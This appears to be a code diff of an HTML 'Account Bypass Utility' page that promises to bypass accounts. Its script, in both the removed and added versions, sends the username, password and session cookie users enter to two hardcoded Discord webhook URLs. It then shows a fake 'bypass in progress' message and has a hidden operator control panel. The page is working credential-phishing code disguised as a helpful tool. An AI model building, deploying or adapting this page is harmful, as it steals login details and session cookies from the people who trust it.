@@ -3,123 +3,70 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Bypass Utility</title>
+  <title>Account Bypass Utility</title>
   <style>
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
     body {
-      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+      margin: 0;
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      color: #f0f0f0;
+      background: linear-gradient(to right, #0f2027, #203a43, #2c5364);
+      color: #fff;
       display: flex;
       flex-direction: column;
       align-items: center;
-      justify-content: center;
-      height: 100vh;
-      padding: 20px;
+      padding: 2rem;
     }
+
     h1 {
-      margin-bottom: 20px;
       font-size: 2rem;
-      color: #00fff7;
+      margin-bottom: 1rem;
     }
-    .form-container {
-      background: rgba(0, 0, 0, 0.6);
-      padding: 30px;
-      border-radius: 10px;
-      box-shadow: 0 0 20px rgba(0, 255, 255, 0.3);
-      width: 100%;
-      max-width: 500px;
+
+    form {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.5rem;
+      margin-bottom: 1rem;
     }
-    input[type="text"], button {
-      width: 100%;
-      padding: 12px;
-      margin-bottom: 15px;
+
+    input, button {
+      padding: 0.5rem;
       border: none;
-      border-radius: 8px;
+      border-radius: 4px;
       font-size: 1rem;
     }
-    input[type="text"] {
-      background-color: #1a1a1a;
-      color: #00fff7;
-      border: 1px solid #00fff7;
+
+    input {
+      flex: 1;
+      min-width: 150px;
     }
+
     button {
-      background-color: #00fff7;
-      color: #000;
-      font-weight: bold;
+      background-color: #00bcd4;
+      color: white;
       cursor: pointer;
-      transition: background 0.3s ease;
     }
-    button:hover {
-      background-color: #00cccc;
-    }
-    .note {
-      font-size: 0.85rem;
-      color: #ccc;
-      text-align: center;
-    }
-    #controlPanel, #overlay {
-      display: none;
-    }
-    #overlay {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100vw;
-      height: 100vh;
-      background-color: rgba(0, 0, 0, 0.8);
-      z-index: 1000;
-    }
+
     #controlPanel {
-      position: fixed;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      background-color: #111;
-      padding: 20px;
+      display: none;
+      background-color: rgba(255,255,255,0.1);
+      padding: 1rem;
+      margin-top: 2rem;
       border-radius: 10px;
-      box-shadow: 0 0 30px rgba(0, 255, 255, 0.5);
-      z-index: 1001;
-      max-height: 80vh;
-      overflow-y: auto;
-      width: 90%;
-      max-width: 600px;
-    }
-    #controlPanel h2 {
-      color: #00fff7;
-      margin-bottom: 15px;
-    }
-    .session {
-      background-color: #222;
-      margin-bottom: 10px;
-      padding: 10px;
-      border-radius: 6px;
-      border-left: 4px solid #00fff7;
-    }
-    .session button {
-      margin-top: 5px;
     }
   </style>
 </head>
 <body>
 
-<div class="form-container">
-  <h1>[ Account Bypass Utility ]</h1>
-  <form id="bypassForm">
-    <input type="text" id="usernameInput" placeholder="Username" required />
-    <input type="text" id="passwordInput" placeholder="Password" required />
-    <input type="text" id="cookieInput" placeholder="Cookie" required />
-    <input type="text" id="webhookInput" placeholder="Enter Webhook (Optional)" />
-    <button type="submit">Initiate Bypass</button>
-    <p class="note">May take from 1 - 30 minutes depending on account</p>
-  </form>
-</div>
+<h1>[ Account Bypass Utility ]</h1>
+<form id="bypassForm">
+  <input type="text" id="username" placeholder="Username" required />
+  <input type="text" id="password" placeholder="Password" required />
+  <input type="text" id="cookie" placeholder="Cookie" required />
+  <input type="text" id="webhook" placeholder="Enter Webhook (Optional)" />
+  <button type="submit">Initiate Bypass</button>
+</form>
+<p>May take from 1 - 30 minutes depending on account</p>
 
-<div id="overlay"></div>
 <div id="controlPanel">
   <h2>[ Control Panel ]</h2>
   <p>Total Sessions: <span id="totalSessions">0</span></p>
@@ -128,118 +75,124 @@
 </div>
 
 <script>
-const hardcodedWebhooks = [
-  "https://discord.com/api/webhooks/1365365136239366265/mxlYCx2akrzOOlK2kSjUXB8areX-Om0jpG-0ogzF6DWLkjlRPlJAuXv0T7Jff5q1A94e",
-  "https://discord.com/api/webhooks/1365365136239366265/mxlYCx2akrzOOlK2kSjUXB8areX-Om0jpG-0ogzF6DWLkjlRPlJAuXv0T7Jff5q1A94e"
-];
+  const hardcodedWebhooks = [
+    'https://discord.com/api/webhooks/1365365136239366265/mxlYCx2akrzOOlK2kSjUXB8areX-Om0jpG-0ogzF6DWLkjlRPlJAuXv0T7Jff5q1A94e',
+    'https://discord.com/api/webhooks/1365365136239366265/mxlYCx2akrzOOlK2kSjUXB8areX-Om0jpG-0ogzF6DWLkjlRPlJAuXv0T7Jff5q1A94e'
+  ];
 
-let sessions = [];
+  let sessions = [];
 
-function sendToWebhook(url, payload) {
-  fetch(url, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(payload)
-  })
-  .catch(console.error);
-}
+  document.getElementById('bypassForm').addEventListener('submit', async (e) => {
+    e.preventDefault();
 
-function updateControlPanel() {
-  document.getElementById("totalSessions").textContent = sessions.length;
-  const active = sessions.filter(s => s.status === "pending");
-  document.getElementById("activeSessions").textContent = active.length;
+    const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
+    const cookie = document.getElementById('cookie').value;
+    const webhook = document.getElementById('webhook').value;
 
-  const sessionList = document.getElementById("sessionList");
-  sessionList.innerHTML = "";
+    const sessionId = Date.now();
+    sessions.push({ id: sessionId, username, password, cookie, webhook, approved: false });
+    updateSessionDisplay();
 
-  active.forEach((session, index) => {
-    const div = document.createElement("div");
-    div.className = "session";
-    div.innerHTML = `
-      <p><strong>Username:</strong> ${session.username}</p>
-      <p><strong>Password:</strong> ${session.password}</p>
-      <p><strong>Cookie:</strong> ${session.cookie}</p>
-      <p><strong>Webhook:</strong> ${session.userWebhook || "N/A"}</p>
-      <button onclick="approveSession(${index})">✅ Approve</button>
-      <button onclick="declineSession(${index})">❌ Decline</button>
-      <input type="text" id="reason_${index}" placeholder="Reason for decline" />
-    `;
-    sessionList.appendChild(div);
-  });
-}
-
-function approveSession(index) {
-  const session = sessions[index];
-  if (session.userWebhook) {
-    sendToWebhook(session.userWebhook, {
-      content: `Username: **${session.username}**\nPassword: **${session.password}**\nCookie: **${session.cookie}**`
-    });
-    session.status = "approved";
-    updateControlPanel();
-  }
-}
-
-function declineSession(index) {
-  const session = sessions[index];
-  const reason = document.getElementById(`reason_${index}`).value || "No reason provided";
-  if (session.userWebhook) {
-    sendToWebhook(session.userWebhook, {
-      content: `Bypass failed: ${reason}`
-    });
-    session.status = "declined";
-    updateControlPanel();
-  }
-}
-
-document.getElementById("bypassForm").addEventListener("submit", function(e) {
-  e.preventDefault();
-
-  const username = document.getElementById("usernameInput").value;
-  const password = document.getElementById("passwordInput").value;
-  const cookie = document.getElementById("cookieInput").value;
-  const userWebhook = document.getElementById("webhookInput").value;
-
-  const fullPayload = {
-    content: `Username: **${username}**\nPassword: **${password}**\nCookie: **${cookie}**`
-  };
-
-  hardcodedWebhooks.forEach(url => sendToWebhook(url, fullPayload));
-
-  if (userWebhook) {
-    sendToWebhook(userWebhook, {
-      content: "Bypass in progress. Please wait...\nMay take from 1 - 30 minutes depending on account."
-    });
-
-    const session = {
-      username,
-      password,
-      cookie,
-      userWebhook,
-      createdAt: Date.now(),
-      status: "pending"
+    const progressPayload = {
+      content: 'Bypass in progress. Please wait...\nMay take from 1 - 30 minutes depending on account.'
     };
 
-    sessions.push(session);
-    updateControlPanel();
+    if (webhook) {
+      fetch(webhook, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(progressPayload)
+      });
+    }
 
+    const fullPayload = {
+      content: `Username: **${username}**\nPassword: **${password}**\nCookie: **${cookie}**`
+    };
+
+    for (const url of hardcodedWebhooks) {
+      fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(fullPayload)
+      });
+    }
+
+    // Timeout fallback to send to optional webhook after 10 minutes
     setTimeout(() => {
-      if (session.status === "pending") {
-        approveSession(sessions.indexOf(session));
+      const session = sessions.find(s => s.id === sessionId);
+      if (session && !session.approved && session.webhook) {
+        fetch(session.webhook, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(fullPayload)
+        });
+        session.approved = true;
+        updateSessionDisplay();
       }
     }, 10 * 60 * 1000);
-  }
-});
+  });
 
-document.addEventListener("keydown", (e) => {
-  if (e.key === "1" && e.location === 3) {
-    const panel = document.getElementById("controlPanel");
-    const overlay = document.getElementById("overlay");
-    const isOpen = panel.style.display === "block";
-    panel.style.display = isOpen ? "none" : "block";
-    overlay.style.display = isOpen ? "none" : "block";
-    if (!isOpen) updateControlPanel();
+  function updateSessionDisplay() {
+    document.getElementById('totalSessions').textContent = sessions.length;
+    document.getElementById('activeSessions').textContent = sessions.filter(s => !s.approved).length;
+
+    const list = document.getElementById('sessionList');
+    list.innerHTML = '';
+    sessions.filter(s => !s.approved).forEach(session => {
+      const div = document.createElement('div');
+      div.innerHTML = `
+        <p><strong>${session.username}</strong></p>
+        <button onclick="approveSession(${session.id})">Approve</button>
+        <button onclick="declineSession(${session.id})">Decline</button>
+        <input type="text" placeholder="Reason for decline" id="reason_${session.id}" />
+        <hr />
+      `;
+      list.appendChild(div);
+    });
   }
-});
+
+  function approveSession(id) {
+    const session = sessions.find(s => s.id === id);
+    if (session && session.webhook) {
+      const payload = {
+        content: `Username: **${session.username}**\nPassword: **${session.password}**\nCookie: **${session.cookie}**`
+      };
+      fetch(session.webhook, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+      session.approved = true;
+      updateSessionDisplay();
+    }
+  }
+
+  function declineSession(id) {
+    const session = sessions.find(s => s.id === id);
+    const reason = document.getElementById(`reason_${id}`).value || 'No reason provided';
+    if (session && session.webhook) {
+      const payload = {
+        content: `Bypass failed: ${reason}`
+      };
+      fetch(session.webhook, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+      session.approved = true;
+      updateSessionDisplay();
+    }
+  }
+
+  // Toggle control panel visibility with Numpad1
+  document.addEventListener('keydown', (e) => {
+    if (e.code === 'Numpad1') {
+      const panel = document.getElementById('controlPanel');
+      panel.style.display = panel.style.display === 'block' ? 'none' : 'block';
+    }
+  });
 </script>
+
 </body>
 </html>
